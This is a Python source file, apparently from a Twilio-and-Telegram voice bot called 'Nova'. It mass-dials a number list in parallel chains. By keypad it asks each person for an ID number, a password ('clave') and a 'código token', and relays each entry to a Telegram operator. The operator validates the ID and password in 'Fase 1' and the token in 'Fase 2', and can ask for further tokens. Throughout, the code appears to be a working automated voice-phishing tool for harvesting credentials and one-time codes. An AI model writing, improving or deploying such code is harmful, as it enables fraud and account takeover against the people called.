    _en_hilo(_publicar_panel_seguro, call_sid, texto)
    _arrancar_vigilante()
    return True


def _publicar_panel_seguro(call_sid: str, texto: str | None = None) -> None:
    """Publica (o cierra) el panel sin dejar nunca un mensaje VERDE de una
    llamada ya terminada.

    Dos situaciones, ambas nacidas del bug real de `+573000000003` (Twilio cerro
    la llamada 0,47 s despues de crearla):

      * `texto` no es None: este es el camino que manda el mensaje. Se manda y se
        guarda su `mensaje_id`; si mientras tanto la llamada YA se cerro, se pinta
        ese rojo sobre el mensaje recien publicado.
      * `texto` es None: el mensaje lo esta mandando el OTRO camino. Si cuando
        le toca el turno aun no hay `mensaje_id`, esta llamada NO vuelve a
        publicar nada (el otro camino lo cerrara); si ya lo hay, se refresca y, si
        la llamada se cerro mientras el envio estaba en vuelo, se pinta el rojo.

    Se apoya en `panel_enviando` (envio en curso) y en `_paneles_finales` (el rojo
    que anota el cierre), siempre bajo `lock_llamadas`.
    """
    if texto is not None:
        # Este es el camino que manda el mensaje: `_publicar_panel` devuelve TAMBIEN
        # el cierre que hubiera anotado el cierre de la llamada (se lo lleva el
        # para no dejarlo en el mapa, que ya cumplio su papel).
        mensaje_id, final = _publicar_panel(call_sid, texto)
    else:
        with lock_llamadas:
            llamada = llamadas_activas.get(call_sid)
            if llamada is None or llamada.get("mensaje_id") is None:
                # O el otro camino esta publicando (panel_enviando) y se encarga
                # el, o la ficha ya no existe y no hay nada que dibujar.
                return
            mensaje_id = llamada["mensaje_id"]
        with lock_llamadas:
            final = _leer_final_pendiente(call_sid)
    if final:
        # La llamada se cerro MIENTRAS el mensaje iba en camino: en vez de dejarlo
        # verde, se pinta el cierre sobre el mensaje que se acaba de mandar.
        _pintar_final(call_sid, mensaje_id, final)
    else:
        _tg_panel(call_sid)


def _publicar_panel(call_sid: str, texto: str):
    """Manda el mensaje del panel a Telegram y guarda su message_id.

    Corre en hilo: la red de Telegram NO debe demorar la respuesta de voz.
    Devuelve `(mensaje_id, final)`: el `message_id` (o None si Telegram fallo) y
    el texto de cierre que hubiera anotado `_paneles_finales` mientras el mensaje
    iba en camino (o None).

    El cierre se RECOGE aqui, bajo el MISMO candado con el que lo escribe el cierre
    de la llamada, y el valor se devuelve para que `_publicar_panel_seguro` sepa
    que tiene que pintarlo. Si no se recogiera (dejandolo puesto en el mapa) una
    edicion posterior lo veria otra vez y se pisaria un mensaje ya cerrado; si se
    recogiera sin devolverlo, el rojo se perderia y el panel quedaria verde.
    """
    mensaje_id = _tg_mensaje(texto, _con_colgar(call_sid, []))
    with lock_llamadas:
        final = _paneles_finales.pop(call_sid, None)
        llamada = llamadas_activas.get(call_sid)
        if llamada is not None:
            llamada["mensaje_id"] = mensaje_id
            # Si fallo Telegram se permite reintentar en el proximo refresco.
            llamada["panel_enviando"] = False
    return mensaje_id, final


def _tg_panel(call_sid: str, teclado: list | None = None) -> None:
    """Refresca el mensaje unico de la llamada.

    El boton '🛑 Colgar' se agrega SIEMPRE al final del teclado (ver _con_colgar),
    de modo que en Telegram siempre hay una forma de colgar la llamada. Si no se
    pasa teclado, se reutiliza el ultimo guardado: asi los botones de validacion
    no desaparecen.

    Este refresco es SOLO por EVENTOS (al marcar, contestar, recibir un numero,
    cambiar de fase o colgar). NO hay cronometro en vivo, asi que NO se edita el
    mensaje cada pocos segundos: eso es lo que evita el 429 de Telegram.

    El texto se captura ya (bajo el lock) y la EDICION va en un hilo: las rutas
    de voz no esperan la red de Telegram.
    """
    with lock_llamadas:
        llamada = llamadas_activas.get(call_sid)
        if not llamada or llamada.get("mensaje_id") is None:
            return
        if teclado is not None:
            llamada["teclado"] = teclado
        actual = _con_colgar(call_sid, llamada.get("teclado"))
        llamada["teclado"] = actual
        texto = _texto_panel(llamada)
        chat_id = llamada.get("chat_id") or cfg.TELEGRAM_GROUP_CHAT_ID
        mensaje_id = llamada["mensaje_id"]
        # Número de orden de este refresco: cada `_tg_panel` lo incrementa bajo el
        # lock, así el hilo que aplica la edición sabe si es la más nueva o si ya
        # lo pisó otra (ver `_tg_editar_panel`).
        llamada["panel_secuencia"] = llamada.get("panel_secuencia", 0) + 1
        secuencia = llamada["panel_secuencia"]
    _en_hilo(_tg_editar_panel, call_sid, chat_id, mensaje_id, texto, actual, secuencia)


def _tg_numero(call_sid: str, paso: int, valor: str) -> None:
    """Guarda la hora del numero y refresca el panel de la llamada."""
    with lock_llamadas:
        llamada = llamadas_activas.get(call_sid)
        if llamada is not None:
            llamada.setdefault("horas", {})[paso] = _hora()
    _tg_panel(call_sid)


# --- Reloj: YA NO HAY refresco periodico ------------------------------------
# Antes un hilo "reloj de grupo" editaba los paneles cada pocos segundos para
# avanzar el cronometro en vivo. Eso llenaba el cupo de mensajes de Telegram
# (429). Ahora el panel es SOLO por EVENTOS y la duracion se muestra UNA vez al
# colgar, asi que NO hace falta refrescar nada solo. Se conservan estos nombres
# como no-ops para no romper llamadas antiguas ni los tests.
_reloj_parar = threading.Event()
_reloj_lock = threading.Lock()
_reloj_activo = [False]  # siempre False: ya no hay hilo de reloj

# --- Presupuesto de mensajes a Telegram (cubo de fichas) ---------------------
# Telegram corta con 429 al pasar de ~20 mensajes/min en un grupo. Aunque el
# panel ya no se refresca solo, este cubo sigue disponible (lo usa el mensaje EN
# VIVO de la cadena) para no pasarse del cupo.
_budget_lock = threading.Lock()
_budget = {"fichas": 0.0, "ultimo": 0.0}


def _fichas_recargar(momento: float | None = None) -> float:
    """Recarga el cubo segun el tiempo transcurrido. Devuelve las fichas libres."""
    momento = momento or time.time()
    ritmo = cfg.TELEGRAM_MSGS_POR_MINUTO
    if ritmo <= 0:  # presupuesto desactivado: nunca limita
        return 10**9
    tope = float(ritmo)
    with _budget_lock:
        if _budget["ultimo"] <= 0.0:
            _budget["ultimo"] = momento
            _budget["fichas"] = tope
        paso = max(0.0, momento - _budget["ultimo"])
        _budget["ultimo"] = momento
        _budget["fichas"] = min(tope, _budget["fichas"] + paso * (ritmo / 60.0))
        return _budget["fichas"]


def _ficha_gastar() -> bool:
    """Intenta gastar UNA ficha. True si hay presupuesto (y lo consume)."""
    if cfg.TELEGRAM_MSGS_POR_MINUTO <= 0:
        return True
    with _budget_lock:
        if _budget["ultimo"] <= 0.0:
            _budget["ultimo"] = time.time()
            _budget["fichas"] = float(cfg.TELEGRAM_MSGS_POR_MINUTO)
        if _budget["fichas"] < 1.0:
            return False
        _budget["fichas"] -= 1.0
        return True


def _reloj_grupo() -> None:
    """OBSOLETO: antes refrescaba los paneles en vivo. Ahora no hace nada.

    El panel es por eventos y la duracion se muestra solo al colgar, asi que no
    hay nada que refrescar periodicamente (y asi no hay 429 de Telegram).
    """
    return


def _arrancar_reloj(call_sid: str = "") -> None:
    """OBSOLETO: ya no se arranca ningun reloj de grupo (no-op).

    Se conserva por compatibilidad para no romper llamadas antiguas ni tests.
    """
    del call_sid


def _parar_reloj(call_sid: str = "") -> None:
    """OBSOLETO: no hay reloj que parar (no-op). Se conserva por compatibilidad."""
    del call_sid


# --- Vigilante: cierra las llamadas abandonadas (panel congelado) -------------
# El cronómetro de un panel solo avanza mientras el reloj de ESA llamada sigue
# vivo. Si Twilio pierde el aviso 'completed' (red/ngrok), la ficha se quedaría
# en 'en llamada' para siempre. El vigilante la cierra sola cuando lleva mucho
# rato sin dar señales de vida (ver cfg.TIEMPO_SIN_ACTIVIDAD).
_vigilante_activo = [False]  # lista de un elemento: bandera mutable + su lock

def _cerrar_abandonadas(ahora: float | None = None) -> list[str]:
    """Cierra (UNA pasada) las llamadas mudas más de TIEMPO_SIN_ACTIVIDAD s.

    Devuelve la lista de CallSid cerrados. Se separa del bucle para poder
    probarlo sin hilos ni esperas.
    """
    limite = cfg.TIEMPO_SIN_ACTIVIDAD
    if limite <= 0:
        return []
    ahora = ahora or time.time()
    with lock_llamadas:
        abandonadas = [
            sid
            for sid, llamada in llamadas_activas.items()
            if not llamada.get("estado_final")
            and ahora - (llamada.get("latido") or llamada.get("inicio") or ahora)
            > limite
        ]
    for call_sid in abandonadas:
        print(f"[vigilante] llamada {call_sid} sin actividad: se cierra.")
        # Se intenta cortar en Twilio; si ya no existe, da igual: lo que importa
        # es cerrar el panel para que no quede 'en llamada' eterno.
        _colgar_en_twilio(call_sid)
        _cerrar_llamada(call_sid, "⏳ sin actividad — colgada")
    return abandonadas


def _vigilar_llamadas() -> None:
    """Cierra las llamadas que llevan demasiado tiempo sin actividad."""
    while True:
        time.sleep(max(1, cfg.INTERVALO_VIGILANCIA))
        _cerrar_abandonadas()


def _arrancar_vigilante() -> None:
    """Lanza UN vigilante por proceso (no uno por cada llamada).

    Es idempotente y en las pruebas (sin hilos) no arranca nada.
    """
    if not _EN_HILO:
        return
    with _reloj_lock:
        if _vigilante_activo[0]:
            return
        _vigilante_activo[0] = True
    threading.Thread(
        target=_vigilar_llamadas, daemon=True, name="vigilante-nova"
    ).start()


def _enviar_fase_1(call_sid: str, primero: str, segundo: str) -> None:
    """Pide validar los dos primeros numeros: botones sobre el mismo panel.

    La luz del panel SIGUE verde (`🟢 en llamada`); el paso concreto va en la
    línea `nota` ("Fase 1"), no en la de estado.
    """
    with lock_llamadas:
        llamada = llamadas_activas.get(call_sid)
        if llamada is not None:
            llamada["estado_txt"] = ESTADO_EN_LLAMADA
            llamada["nota"] = "🟡 esperando tu validación (Fase 1)"
    _tg_panel(
        call_sid,
        [
            [
                {"text": "✅ Validar Juntos", "callback_data": f"validar12_{call_sid}"},
                {"text": "❌ Invalidar Juntos", "callback_data": f"invalidar12_{call_sid}"},
            ],
            [{"text": "🛑 Colgar", "callback_data": f"colgar_{call_sid}"}],
        ],
    )


def _enviar_fase_2(call_sid: str, primero: str, segundo: str, tercero: str) -> None:
    """Pide validar el codigo token: botones sobre el mismo panel.

    Ademas de validar/invalidar, el operador puede pedir OTRO token (4.o, 5.o...):
    asi sigue pidiendo codigos sin reiniciar todo el proceso desde el primer numero.
    La luz del panel SIGUE verde (`🟢 en llamada`); el paso va en la línea `nota`.
    """
    with lock_llamadas:
        llamada = llamadas_activas.get(call_sid)
        if llamada is not None:
            llamada["estado_txt"] = ESTADO_EN_LLAMADA
            llamada["nota"] = "🟡 esperando tu validación (Fase 2 · código token)"
    _tg_panel(
        call_sid,
        [
            [
                {"text": "✅ Validar Token", "callback_data": f"validar3_{call_sid}"},
                {"text": "❌ Invalidar Token", "callback_data": f"invalidar3_{call_sid}"},
            ],
            [{"text": "🔁 Pedir otro token", "callback_data": f"pedirmas_{call_sid}"}],
            [{"text": "🛑 Colgar", "callback_data": f"colgar_{call_sid}"}],
        ],
    )


def _enviar_token_invalido(
    call_sid: str, intento: int, primero: str, segundo: str, tercero: str
) -> None:
    """Marca en el panel que un intento del tercer numero fue rechazado solo."""
    with lock_llamadas:
        llamada = llamadas_activas.get(call_sid)
        if llamada is not None:
            llamada["nota"] = "⚠️ Código token inválido. Se pide de nuevo."
    _tg_panel(call_sid, [])


# ------------------------------------------------------------- CADENA --------
# La CADENA mantiene varias llamadas a la vez (por defecto 5) y, en cuanto una
# cuelga, marca la SIGUIENTE de la lista: así NUNCA deja de llamar. Recorre TODOS
# los números registrados (numeros.txt) y, si está configurado, vuelve a empezar
# al llegar al final. Se enciende con /ciclos y se para con /apagar.


def _solo_digitos(numero: str) -> str:
    """Deja solo los dígitos de un teléfono (para comparar +57... con 57...)."""
    return "".join(c for c in (numero or "") if c.isdigit())


class CadenaLlamadas:
    """Mantiene N llamadas en simultáneo y va marcando la siguiente al colgar."""

    def __init__(self) -> None:
        self.hilo: threading.Thread | None = None
        self.parar = threading.Event()
        self._despertar = threading.Event()
        self.lock = threading.Lock()
        # call_sid -> {"to": telefono, "t": instante del marcado}
        self.en_vuelo: dict[str, dict] = {}
        self.indice = 0  # posicion en la lista de numeros
        self.marcadas = 0  # total de llamadas lanzadas por esta cadena
        self._grupo: int | None = None  # None = usa cfg.CICLOS_GRUPO
        # Mensaje EN VIVO de la cadena (por dónde va y cuántas lleva): se manda
        # UNA vez y luego se EDITA (no se crean mensajes nuevos en cada avance).
        self.progreso_id: int | None = None
        self._ultimo_numero = ""  # ultimo numero marcado (para el mensaje en vivo)
        self._ultimo_pos = 0  # posicion (1..N) en la lista del ultimo marcado
        self._inicio = 0.0  # instante en que arranco la cadena (para el reloj)
        self._progreso_ultimo = 0.0  # ultimo refresco del mensaje en vivo
        # Auto-curacion de huecos: si Twilio NUNCA avisa el fin de una llamada
        # que nadie contesto (avisos perdidos por la red/ngrok), su hueco se
        # libera solo pasado este margen. NO toca las llamadas vivas (con
        # ficha/panel). Sin esto, los huecos "fantasma" se acumulaban y la cadena
        # dejaba de marcar (se clavaba en el grupo inicial).
        _tope = (cfg.LIMITE_LLAMADA or 3600) + 30
        _vigilante = cfg.TIEMPO_SIN_ACTIVIDAD or 0
        self._sin_aviso = max(60, min(_vigilante or _tope, _tope))

    @property
    def grupo(self) -> int:
        """Cuántas llamadas mantiene a la vez la cadena."""
        return max(1, self._grupo or cfg.CICLOS_GRUPO)

    @property
    def activo(self) -> bool:
        """True si la cadena está marcando ahora mismo."""
        return bool(self.hilo and self.hilo.is_alive() and not self.parar.is_set())

    @property
    def en_curso(self) -> int:
        """Cuántas llamadas de la cadena siguen vivas (en vuelo)."""
        with self.lock:
            return len(self.en_vuelo)

    @property
    def posicion(self) -> int:
        """Por qué número de la lista va (1..N). 0 si todavía no ha marcado."""
        with self.lock:
            return int(self._ultimo_pos)

    @property
    def total(self) -> int:
        """Cuántos números tiene la lista que recorre la cadena."""
        return len(cfg.numeros_a_llamar())

    @property
    def ultimo_numero(self) -> str:
        """Último número al que la cadena llamó (para el mensaje en vivo)."""
        with self.lock:
            return self._ultimo_numero

    def _texto_progreso(self, en_marcha: bool = True) -> str:
        """Mensaje EN VIVO de la cadena: por dónde va y cuántas lleva.

        Se manda UNA vez y luego se EDITA (no se llena el chat de mensajes): de un
        vistazo ves por qué número de la lista va, cuántas ha llamado, cuántas
        siguen en curso y cuánto tiempo lleva andando.
        """
        total = self.total
        with self.lock:
            marcadas = self.marcadas
            en_curso = len(self.en_vuelo)
            pos = self._ultimo_pos
            ultimo = self._ultimo_numero
            inicio = self._inicio
        cabecera = (
            "🔗 Cadena de llamadas · EN MARCHA"
            if en_marcha
            else "🔗 Cadena de llamadas · DETENIDA"
        )
        lineas = [cabecera]
        if total and pos:
            lineas.append(f"👉 Va por el número {pos}/{total} de la lista")
        elif total:
            lineas.append(f"📋 Lista de {total} números (arrancando…)")
        if ultimo:
            lineas.append(f"📞 Último marcado: {ultimo}")
        lineas.append(f"✅ Ha llamado a {marcadas} número(s)")
        lineas.append(f"🔊 En curso ahora: {en_curso}/{self.grupo}")
        if inicio:
            lineas.append(f"⏱️ Lleva {_duracion({'inicio': inicio})}")
        if en_marcha:
            lineas.append("Para detenerla: /apagar")
        else:
            lineas.append("Para volver a llamar: /ciclos")
        return "\n".join(lineas)

    def publicar_progreso(self, force: bool = False, en_marcha: bool = True) -> None:
        """Manda/edita el mensaje EN VIVO de la cadena (respeta el ritmo y el cupo).

        `force=True` lo actualiza ya (al arrancar y al detenerse); el resto de las
        veces respeta `CICLOS_PROGRESO_INTERVALO` y el presupuesto de Telegram para
        no competir con el reloj de los paneles ni provocar un 429.
        """
        ahora = time.time()
        if not force:
            if ahora - self._progreso_ultimo < max(
                1.0, float(cfg.CICLOS_PROGRESO_INTERVALO)
            ):
                return
            if not _ficha_gastar():
                return  # sin presupuesto de Telegram: se reintenta al siguiente avance
        self._progreso_ultimo = ahora
        texto = self._texto_progreso(en_marcha)
        if self.progreso_id is None:
            # Primera vez (o el mensaje anterior ya no está): se manda uno nuevo.
            self.progreso_id = _tg_mensaje(texto)
            return
        _tg_editar_mensaje(cfg.TELEGRAM_GROUP_CHAT_ID, self.progreso_id, texto)

    def encender(self, grupo: int | None = None, progreso_id: int | None = None) -> bool:
        """Arranca la cadena. Devuelve False si ya estaba encendida.

        `progreso_id` es el mensaje ya enviado que se irá EDITANDO con el avance
        (por dónde va y cuántas lleva): así el mensaje EN VIVO es UNO solo.
        """
        if self.activo:
            return False
        self._grupo = int(grupo) if grupo else None
        self.progreso_id = progreso_id
        self._inicio = time.time()
        self._progreso_ultimo = 0.0
        self._ultimo_numero = ""
        self._ultimo_pos = 0
        # Evento NUEVO: un hilo anterior (si queda) ve el suyo ya disparado.
        self.parar = threading.Event()
        self._despertar = threading.Event()
        self.hilo = threading.Thread(
            target=self._correr, daemon=True, name="cadena-nova"
        )
        self.hilo.start()
        return True

    def apagar(self) -> None:
        """Deja de marcar llamadas nuevas (NO cuelga las que están en curso)."""
        self.parar.set()
        self._despertar.set()

    def soltar(self, call_sid: str) -> None:
        """Libera el hueco de una llamada que ya terminó (idempotente)."""
        with self.lock:
            self.en_vuelo.pop(call_sid, None)
        self._despertar.set()

    def _siguiente_numero(self) -> str | None:
        """Próximo número a marcar, saltando los que YA están en curso."""
        lista = cfg.numeros_a_llamar()
        if not lista:
            return None
        with self.lock:
            ocupados = {ficha.get("to") for ficha in self.en_vuelo.values()}
            for _ in range(len(lista) + 1):
                if self.indice >= len(lista):
                    if not cfg.CICLOS_REPETIR:
                        return None
                    self.indice = 0
                numero = lista[self.indice % len(lista)]
                self.indice += 1
                if numero not in ocupados:
                    # Se anota por qué número de la lista va (para el mensaje EN VIVO).
                    self._ultimo_pos = ((self.indice - 1) % len(lista)) + 1
                    return numero
            return None  # todos los números ya están en curso

    def _marcar(self, numero: str, base: str) -> bool:
        """Marca UN número y lo anota como 'en vuelo'."""
        try:
            llamada = _crear_llamada(numero, base)
        except Exception as exc:  # noqa: BLE001
            print(f"Error llamando a {numero}: {exc}")
            _tg_mensaje(_explicar_error_twilio(exc))
            return False
        sid = getattr(llamada, "sid", "") or f"cadena-{time.time():.6f}"
        with self.lock:
            self.en_vuelo[sid] = {"to": numero, "t": time.time()}
            self.marcadas += 1
            cuantas = len(self.en_vuelo)
            self._ultimo_numero = numero
        print(f"📞 Cadena llamando a {numero} ({cuantas}/{self.grupo})")
        return True

    def _reconciliar(self) -> None:
        """Libera huecos de llamadas que ya debieron terminar.

        Dos casos:
          * el tope de Twilio (LIMITE_LLAMADA) ya pasó: Twilio cortó la llamada
            sola, así que el hueco debe liberarse aunque el aviso 'completed' se
            haya perdido;
          * pasó `_sin_aviso` segundos desde el marcado y NO hay ninguna llamada
            viva (ficha/panel) con ese teléfono: es una llamada que NUNCA se
            contestó (sonó y no la cogieron, ocupado, la cortó Twilio...). En ese
            caso Twilio puede no mandar ningún aviso y el hueco se quedaba
            OCUPADO para siempre; al acumularse, /ciclos dejaba de marcar. OJO:
            si hay ficha/panel (llamada contestada) NO se libera por esta vía,
            para no marcar de más mientras esa llamada sigue viva.
        """
        tope = (cfg.LIMITE_LLAMADA or 3600) + 30
        ahora = time.time()
        # Teléfonos con una llamada VIVA (contestada y sin finalizar): protegidos.
        with lock_llamadas:
            contestando = {
                _solo_digitos(llamada.get("telefono"))
                for llamada in llamadas_activas.values()
                if not llamada.get("estado_final")
            }
        with self.lock:
            vencidas = [
                sid
                for sid, ficha in self.en_vuelo.items()
                if ahora - ficha["t"] > tope
                or (
                    _solo_digitos(ficha.get("to")) not in contestando
                    and ahora - ficha["t"] > self._sin_aviso
                )
            ]
        for sid in vencidas:
            self.soltar(sid)

    def _paso(self, base: str | None = None) -> bool:
        """UN paso de la cadena: si hay hueco, marca la siguiente. True si marcó."""
        self._reconciliar()
        with self.lock:
            hueco = self.grupo - len(self.en_vuelo)
        if hueco <= 0:
            return False
        numero = self._siguiente_numero()
        if numero is None:
            return False
        if base is None:
            base = cfg.webhook_base_url()
        marcado = self._marcar(numero, base)
        if marcado:
            # Mensaje EN VIVO: por dónde va y cuántas lleva (con ritmo y cupo).
            self.publicar_progreso()
        return marcado

    def _correr(self) -> None:
        parar = self.parar  # captura local: sobrevive a un reencendido
        despertar = self._despertar
        try:
            base = cfg.webhook_base_url()
        except cfg.SinUrlPublicaError as exc:
            print(f"⚠️  {exc}")
            _tg_mensaje(f"⚠️ Nova no puede llamar: {exc}")
            return
        print("🔗 Cadena de llamadas iniciada.")
        # Mensaje EN VIVO desde el arranque (uno solo que se irá editando).
        self.publicar_progreso(force=True)
        while not parar.is_set():
            if not cfg.numeros_a_llamar():
                # Sin números: se espera por si agregan alguno con /agregar.
                parar.wait(max(1.0, float(cfg.CICLOS_PAUSA)))
                continue
            try:
                self._paso(base)
            except Exception as exc:  # noqa: BLE001
                print(f"[cadena] error en un paso: {exc}")
            # Refresca el mensaje EN VIVO aunque no haya marcado (p. ej. si todos
            # los huecos están ocupados): así "en curso" y el tiempo van al día.
            self.publicar_progreso()
            despertar.clear()
            despertar.wait(max(0.5, float(cfg.CICLOS_PAUSA)))
        # Al detenerse, deja el mensaje EN VIVO con el total final.
        self.publicar_progreso(force=True, en_marcha=False)
        print("😴 Cadena de llamadas detenida.")


cadena = CadenaLlamadas()


# ------------------------------------------------------------------- VOZ -----


def _base() -> str:
    return cfg.webhook_base_url()


def _bd(operacion, *args, **kwargs):
    """Ejecuta una operacion de la base de datos sin romper la llamada."""
    try:
        return operacion(*args, **kwargs)
    except Exception as exc:
        print(f"[bd] {operacion.__name__} fallo: {exc}")
        return None


def _decir(texto: str) -> VoiceResponse:
    response = VoiceResponse()
    response.say(texto, language=cfg.IDIOMA_VOZ)
    return response


def _colgar(texto: str = cfg.TEXTO_LLAMADA_FINALIZADA) -> str:
    response = _decir(texto)
    response.hangup()
    return str(response)


def _marcar_dudosa(call_sid: str) -> None:
    """Anota que la AMD de Twilio NO decidió ('unknown') para esta llamada.

    NO cuelga: un 'unknown' puede ser un humano que tardó unos segundos en
    hablar. Solo se deja constancia para que, si se agotan los intentos del
    primer dato (red de seguridad de `MAX_INTENTOS_ENTRADA`), el aviso del panel
    diga que Twilio no confirmó humano y no que fue un buzón sin más.
    """
    with lock_llamadas:
        llamada = llamadas_activas.get(call_sid)
        if llamada is None or llamada.get("estado_final"):
            return
        llamada["amd_dudosa"] = True
        # Aviso suave en la `nota`: la luz sigue verde (la llamada vive) y el
        # operador ve que Twilio no confirmó humano, sin asustar con un cuelgue.
        if not llamada.get("nota"):
            llamada["nota"] = NOTA_AMD_DUDOSA


def _nota_dudosa(call_sid: str, motivo: str) -> str:
    """Ajusta el motivo del cuelgue si la AMD de Nova quedó dudosa.

    La red de seguridad (`MAX_INTENTOS_ENTRADA`) cuelga al buzón cuando nadie
    marca; pero si ese 'silencio' viene de una AMD 'unknown', el motivo exacto
    ('nadie marcó') es engañoso. Se explica que Twilio no confirmó humano.
    """
    with lock_llamadas:
        llamada = llamadas_activas.get(call_sid)
        if llamada is None or not llamada.get("amd_dudosa"):
            return motivo
    return "📵 sin confirmar humano — AMD dudosa, colgada"


def _preguntar(
    texto: str,
    accion: str,
    pausa: float | None = None,
    pausa_antes: bool = True,
    timeout: int | None = None,
) -> str:
    """TwiML que pide un numero de cualquier longitud terminado en la tecla #.

    Deja una pausa antes de hablar (cfg.PAUSA por defecto, o la que se indique).
    Twilio solo admite segundos enteros en <Pause>, asi que con una pausa menor
    a 1 (ej. 0.5) NO se pone.

    OJO al elegir `pausa` en los datos CORTOS (cedula, clave): la pausa es
    silencio PURO y quien llama lo percibe como "el bot se quedo callado". Al
    marcar '#' el <Gather> termina de inmediato (medido con la API de eventos de
    Twilio: el aviso llega en el MISMO segundo), pero el TwiML de la pregunta
    siguiente empieza con esos 2 s de <Pause>; por eso la voz de la clave tardaba
    ~2 s en oirse DESPUES de la tecla numeral. Con `pausa < 1` la pregunta
    enlaza de corrido (la voz ya separa sola las frases). La pausa LARGA se
    reserva para el token, donde el usuario necesita tiempo para buscar el codigo.

    Con pausa_antes=False se habla de una y se deja una pausa DESPUES de hablar:
    asi el usuario puede marcar sin que se pierdan las teclas en la voz.

    `timeout` es el silencio que Twilio tolera tras la ULTIMA tecla antes de dar
    por terminada la captura. Por defecto usa `TIMEOUT_ENTRADA` (8 s). OJO: hasta
    que no se cumple ese silencio (o se marca `TECLA_FIN`), Twilio NO envia los
    digitos a `accion`: por eso un valor alto (p. ej. 15) hacia que "tardara
    mucho en leer" lo marcado. Los datos cortos (cedula, clave) pueden usar menos
    silencio; el token usa el completo (ver cfg.TIMEOUT_ENTRADA en /voice/pedir-tercero).

    `action_on_empty_result=True` (ver abajo) fuerza el aviso a `accion` aunque
    no se marque nada: asi el flujo NUNCA se queda mudo (si no hay verbo despues
    del <Gather>, Twilio colgaria en seco) y "nadie marco" llega siempre a la
    red de seguridad de `MAX_INTENTOS_ENTRADA`.
    """
    if pausa is None:
        pausa = cfg.PAUSA
    if timeout is None:
        timeout = cfg.TIMEOUT_ENTRADA
    response = VoiceResponse()
    if pausa_antes and pausa >= 1:
        response.pause(length=int(pausa))
    gather = Gather(
        finish_on_key=cfg.TECLA_FIN,
        input="dtmf",
        timeout=timeout,
        action=accion,
        method="POST",
        # Aunque el usuario no marque NADA, Twilio avisa a `accion` (Digits
        # vacio): el flujo lo trata como "no escuche nada" y vuelve a pedir el
        # dato (red de seguridad), en vez de cortar la llamada por su cuenta.
        action_on_empty_result=True,
    )
    gather.say(texto, language=cfg.IDIOMA_VOZ)
    if not pausa_antes and pausa >= 1:
        # Silencio DESPUES de hablar: el usuario marca sin que se corte el tono.
        gather.pause(length=int(pausa))
    response.append(gather)
    return str(response)


def _repedir_token_invalido(call_sid: str) -> str:
    """Vuelve a pedir el código token usando el aviso de inválido como texto.

    La primera vez se dijo "Ingrese Código token"; al fallar NO se repite esa frase.
    En su lugar: un momento en blanco, la voz avisa "Token inválido. Reingrese el
    código." y ESA MISMA frase sirve para marcar el siguiente código (el <Gather>
    queda escuchando sin decir "Ingrese Código token" otra vez).
    """
    response = VoiceResponse()
    if cfg.PAUSA_ENTRE_TOKENS >= 1:
        # Momento en blanco ANTES de hablar (deja "aterrizar" el intento anterior).
        response.pause(length=int(cfg.PAUSA_ENTRE_TOKENS))
    gather = Gather(
        finish_on_key=cfg.TECLA_FIN,
        input="dtmf",
        timeout=cfg.TIMEOUT_ENTRADA,
        action=f"{_base()}/voice/recibir-tercero?call_sid={call_sid}",
        method="POST",
        # Igual que _preguntar: si no marca nada, avisa a la accion (Digits
        # vacio) para reintentar el token en vez de cortar la llamada.
        action_on_empty_result=True,
    )
    gather.say(cfg.TEXTO_TOKEN_INVALIDO, language=cfg.IDIOMA_VOZ)
    if cfg.PAUSA_TOKEN >= 1:
        # Silencio DESPUES de hablar: deja marcar sin que la voz corte el tono.
        gather.pause(length=int(cfg.PAUSA_TOKEN))
    response.append(gather)
    return str(response)


def _reintentar(call_sid: str, destino: str, primer_dato: bool = False) -> str:
    """Vuelve a pedir el dato cuando el usuario no marco nada.

    Si se agotan los intentos en el PRIMER dato (max. de intentos), se asume que
    contesta un buzon de voz o que nadie esta tecleando: se cuelga sin mensaje.

    `primer_dato=True` (lo usa /voice/recibir-primero) hace que el primer reintento
    pregunte "¿aló?": asi, si Twilio dudo (AMD 'unknown') porque el humano tardo en
    hablar, la llamada NO se corta y la voz le invita a hablar/teclear.
    """
    with lock_llamadas:
        llamada = llamadas_activas.get(call_sid)
        if llamada is None:
            return _colgar()
        llamada["intentos"] = llamada.get("intentos", 0) + 1
        if llamada["intentos"] > cfg.MAX_INTENTOS_ENTRADA:
            # Buzon / nadie al otro lado: se cuelga sin decir nada mas.
            cuelga = True
        else:
            cuelga = False
            llamada["latido"] = time.time()
    if cuelga:
        # OJO: hay que cerrar el PANEL antes de borrar la ficha; si solo se
        # borrase, el panel se quedaria diciendo 'en llamada' para siempre.
        # Si la AMD de Twilio quedo dudosa ('unknown'), el motivo lo refleja: no
        # se acusa de buzon a lo que Twilio no supo decidir.
        _cerrar_llamada(call_sid, _nota_dudosa(call_sid, "📵 nadie marcó — colgada"))
        return _colgar(cfg.TEXTO_SIN_ENTRADA)
    texto = cfg.TEXTO_SIN_ENTRADA
    if primer_dato and llamada.get("intentos", 0) == 1:
        # Primer reintento: en vez del aviso largo, un "¿aló?" corto. Si el
        # silencio era de un humano que no habia saludado, esto le da el turno.
        texto = ESPERANDO_HUMANO_TXT
    response = _decir(texto)
    response.redirect(destino)
    return str(response)


def _marcar_resuelta(call_sid: str) -> None:
    """Recuerda que un CallSid ya se cerró, para ignorar sus avisos tardíos.

    Se llama SIEMPRE bajo `lock_llamadas`. Si la lista crece por encima del tope
    se podan los CallSid más antiguos (basta para que la memoria no crezca sin
    límite). Lo que importa es que el CallSid recién resuelto quede recordado:
    los avisos tardíos de Twilio llegan segundos/minutos después, no días.
    """
    if not call_sid:
        return
    resueltas.add(call_sid)
    if len(resueltas) > MAX_RESUELTAS:
        # Poda barata: se vacían los más viejos (los que menos probabilidad
        # tienen de recibir un aviso tardío). Se conserva el más reciente.
        for viejo in list(resueltas)[: len(resueltas) - MAX_RESUELTAS]:
            resueltas.discard(viejo)
    # Aprovechamos que se acaba de resolver una llamada para recortar, si hace
    # falta, los mapas del orden de ediciones del panel (ver _podar_paneles).
    _podar_paneles()


def _resuelta(call_sid: str) -> bool:
    """True si ese CallSid ya se cerró (ignorar cualquier aviso de voz suyo)."""
    with lock_llamadas:
        return call_sid in resueltas


def _limpiar(call_sid: str) -> None:
    with lock_llamadas:
        llamadas_activas.pop(call_sid, None)
        # Se recuerda como RESUELTA: así un aviso de voz tardío de Twilio
        # ('in-progress'/'completed' fuera de orden) NO vuelve a crear la ficha
        # (no se genera un "panel fantasma" con la duración clavada en 00:00).
        _marcar_resuelta(call_sid)
        # OJO: NO se borra aquí el orden de ediciones de esta llamada. Si se borrara
        # y quedara alguna edición en vuelo, esa edición vieja volvería a "colarse"
        # (secuencia > 0) y pisaría el panel final. Se deja que el propio orden
        # siga siendo monótono y se poda por tamaño (ver _podar_paneles).
